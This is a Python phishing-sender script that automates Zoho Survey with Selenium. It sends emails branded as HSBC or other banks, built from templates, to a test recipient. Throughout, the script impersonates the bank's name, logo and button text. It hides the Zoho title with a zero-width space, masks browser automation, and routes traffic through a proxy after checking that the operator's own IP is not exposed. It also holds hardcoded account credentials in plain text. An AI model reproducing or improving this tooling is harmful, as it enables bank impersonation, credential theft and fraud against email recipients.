"""
Clean send test — uses templates.json for authentic brand data.
Pulls template by ID (default: hsbc), sends to fat45sam@gmail.com.
survey_name = zero-width space so Zoho title bar shows blank (just black bar).
Subject + body + logo from template for inbox-friendly delivery.
"""
import sys, os, json, time, random
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

import discover_invite as DI

EMAIL_USER = "daniel.gutierrez-maturana@alumnos.uvigo.es"
EMAIL_PASS = "daniagenteespecial007"
DI.EMAIL   = EMAIL_USER
DI.PW_IMAP = EMAIL_PASS

cfg    = json.load(open("sender_cfg.json", encoding="utf-8"))
PORTAL = cfg["portal"]
DEPT   = cfg["dept"]
PROXY  = cfg["proxy_str"]

# Load template from templates.json — change TMPL_ID to test other brands
TMPL_ID  = "hsbc"   # change to "chase", "wellsfargo", etc.
TEST_TO  = "fat45sam@gmail.com"

templates = json.load(open("templates.json", encoding="utf-8"))
tmpl = next((t for t in templates if t.get("id") == TMPL_ID), templates[0])

BRAND     = tmpl.get("org_name", "HSBC")
SUBJECT   = tmpl.get("subject", tmpl.get("email_subject", f"{BRAND} — account update"))
FROM_NAME = tmpl.get("from_name", BRAND)
BTN_TEXT  = tmpl.get("btn_text", "Continue")
LOGO_URL  = tmpl.get("logo_url", "")

print(f"Template : {tmpl.get('name', BRAND)}")
print(f"Subject  : {SUBJECT}")
print(f"From     : {FROM_NAME}")
print(f"Button   : {BTN_TEXT}")
print(f"Logo     : {LOGO_URL or '(none)'}")

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import tempfile, shutil

profile_dir = tempfile.mkdtemp(prefix="zoho_clean_")
opts = Options()
opts.add_argument(f"--user-data-dir={profile_dir}")
opts.add_argument("--no-sandbox")
opts.add_argument("--disable-dev-shm-usage")
opts.add_argument("--disable-blink-features=AutomationControlled")
opts.add_argument("--window-size=1200,900")
opts.add_experimental_option("excludeSwitches", ["enable-automation"])
opts.add_experimental_option("useAutomationExtension", False)

try:
    from zoho_sender_gui import _AuthProxyTunnel
    lp = _AuthProxyTunnel.get_port(PROXY)
    opts.add_argument(f"--proxy-server=http://127.0.0.1:{lp}")
    print(f"Proxy tunnel :{lp}")
except Exception as e:
    opts.add_argument(f"--proxy-server=socks5://{PROXY.rsplit('@',1)[1]}")
    print(f"Direct socks5 ({e})")

print("Starting Chrome...")
d = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=opts)

try:
    # IP check
    d.get("https://api.ipify.org?format=json"); time.sleep(3)
    ip = d.find_element("tag name", "body").text
    print(f"Browser IP: {ip}")
    assert "156.216" not in ip, "MACHINE IP — STOP"
    print("Proxy OK")

    # Login
    d.get("https://survey.zoho.com/survey/newui"); time.sleep(4)
    DI.login_if_needed(d, email=EMAIL_USER, imap_pw=EMAIL_PASS)
    time.sleep(3)

    # 1. Create fresh survey — named BRAND so collector inherits it
    print(f"\n[1] Creating fresh survey '{BRAND}'...")
    import unittest.mock as mock
    sys.modules.setdefault('webview', mock.MagicMock())
    from zoho_sender_gui import _create_blank_survey, _add_dummy_question

    survey_id = _create_blank_survey(d, PORTAL, DEPT, survey_name=BRAND)
    print(f"    Survey ID: {survey_id}")
    assert survey_id, "Survey creation failed!"
    _add_dummy_question(d, PORTAL, DEPT, survey_id)
    print(f"    Dummy question added")

    # 2. Set Zoho Begin Survey button text
    print(f"\n[2] Setting button text → '{BTN_TEXT}'")
    r = DI.set_survey_button_text(d, PORTAL, DEPT, survey_id, BTN_TEXT)
    print(f"    Result: {r}")

    # 3. Set logo on survey intro page (if available)
    if LOGO_URL:
        print(f"\n[2b] Setting survey header logo...")
        DI.set_survey_header_logo(d, PORTAL, DEPT, survey_id, LOGO_URL)

    # 4. Build HTML from template
    from zoho_sender_gui import _build_email_html
    cfg2 = dict(cfg)
    cfg2["survey"] = survey_id
    html = _build_email_html(cfg2, template=tmpl)
    print(f"\n[3] HTML built — {len(html)} chars | logo={'YES' if LOGO_URL else 'NO'}")

    # 5. Send
    # survey_name = zero-width space → Zoho title bar shows as blank black bar
    # Our branded header in the HTML body is the visual identity
    ZWS = "​"
    print(f"\n[4] Sending to {TEST_TO}...")
    ok = DI.configure_email_invite(
        d, PORTAL, DEPT, survey_id,
        subject=SUBJECT,
        body_html=html,
        recipients=[TEST_TO],
        from_name=FROM_NAME,
        send_mode="now",
        survey_name=ZWS,
    )
    print(f"    Result: {ok}")
    if ok:
        print(f"\n✓ SUCCESS — check {TEST_TO}")
        print(f"  Subject : {SUBJECT}")
        print(f"  From    : {FROM_NAME}")
        print(f"  Button  : {BTN_TEXT}")
        print(f"  Title bar: (blank black bar — ZWS trick)")
    else:
        print("✗ FAILED")

except Exception as e:
    import traceback; traceback.print_exc()
finally:
    time.sleep(4)
    d.quit()
    shutil.rmtree(profile_dir, ignore_errors=True)
    print("Done.")
